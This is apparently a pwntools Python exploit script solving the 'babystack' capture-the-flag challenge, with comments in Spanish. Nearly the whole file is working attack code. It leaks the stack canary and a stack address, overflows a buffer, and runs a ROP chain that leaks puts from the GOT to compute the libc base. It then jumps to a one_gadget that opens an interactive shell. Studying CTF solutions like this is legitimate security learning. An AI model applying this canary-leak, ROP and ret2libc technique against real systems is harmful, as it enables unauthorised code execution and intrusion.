#!/usr/bin/env python

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
#p = process("./babystack")
binf = ELF("babystack")
libc = binf.libc 
#p = remote("chall.ctf.bamboofox.tw", 10102)
p=process('babystack')

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)


context.log_level = "DEBUG"


p=start()
#pause()

#SEND NAME AND TOKEN
p.sendafter("Name: \n", "A"*1)
#p.sendafter("Hello, please give me your token: \n", "B"*0x10)
p.sendafter("Hello, please give me your token: \n", "deadbeef")
info("NOMBRE Y TOKEN ENVIADO")
#pause()

# round one
payload = "A"*9
p.sendafter("str1: \n", payload)
info("ENVIANDO NOMBRE")
#pause()

p.recvuntil("A"*9)
canary = u64("\x00" + p.recv(7))
stack = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
success('LEAK STACK OBTENIDO')
success(hex(stack))
success('LEAK CANARY OBTENIDO')
success(hex(canary))
#pause()

p.sendafter("str2: \n", "A"*(0x8))
#pause()

#round two
payload = "\x00"+"A"*(0x10-1)
p.sendafter("str1: \n", payload)
success('AS Y NULL BYTE ENVIADO')
#pause()

payload = p32(0x40)
payload += p32(0xffffff00)
payload += p64(0)*4
payload += p64(canary)
payload += p64(stack+0x30+0x28)   #overweite read
p.sendafter("str2: \n", payload)
success('CANARY PARA OVERFLOW USADO')
print(bytes(payload))
#pause()

#round three
#get libc leak
sleep(1)
payload = p64(0x0401169)#pop rbp ret
payload += p64(stack-0x30+0x48)
payload += p64(0x00000000004011E5)#creo que aqui es para regresar al main
#pause()
p.send(payload)#para str1
success('PRIMER PAYLOAD PARA STR1 ENVIADO')
print(bytes(payload))
pause()

#crafting leak libc payload
sleep(1)
payload = p64(0x004014bb)#pop r15 ret
payload += p64(binf.got['puts'])
payload += p64(binf.plt['puts'])
payload += p64(0x004014bb)#
payload += p64(binf.got['puts'])
payload += p64(binf.plt['strlen'])
payload += p64(0x004014bb)
payload += p64(0)
payload += p64(0x004014b9)
payload += p64(stack+0x18)
payload += p64(1)
payload += p64(binf.plt['read'])
p.send(payload)#para str2
sleep(0.2)
success('PRIMER PAYLOAD PARA STR2 ENVIADO')
print(bytes(payload))
pause()

#Round round
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
base = leak-libc.symbols['puts']
one = base + 0x106ef8 # este gadget si me sale con one gadget
success('LEAK PARA ONE GADGET OBTENIDO')
success("HEX LEAK ")
success(hex(leak))
success("BASE ")
success(hex(base))
success("ONE 0")
success(hex(one))
pause()


#Final Round... one gadget
payload = "A"*0x60
payload += p64(one)
payload += p64(0)*0x20
p.send(payload)
success('PAYLOAD FINAL ENVIADO')
print(bytes(payload))
pause()
p.interactive()
